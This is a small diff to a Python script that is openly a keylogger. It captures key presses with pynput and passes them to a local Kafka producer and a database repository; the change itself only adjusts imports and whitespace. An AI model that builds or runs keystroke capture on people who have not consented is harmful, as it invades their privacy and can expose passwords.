@@ -2,9 +2,9 @@ from pynput import keyboard
 import threading
 import logging
 import time
-import asyncio
 from db.repository.KeyloggerRepository import KeyloggerRepository
 from kafkadir.KafkaProducerWrapper import KafkaProducerWrapper
+import kafka.errors
 
 keystrokes = ""
 start_time = time.time()
@@ -33,6 +33,7 @@ def on_press(key):
 
 keyboardListener = keyboard.Listener(
     on_press=on_press)
+
 
 kafka_producer = KafkaProducerWrapper(['localhost:9092'])
 keyloggerRepository = KeyloggerRepository()
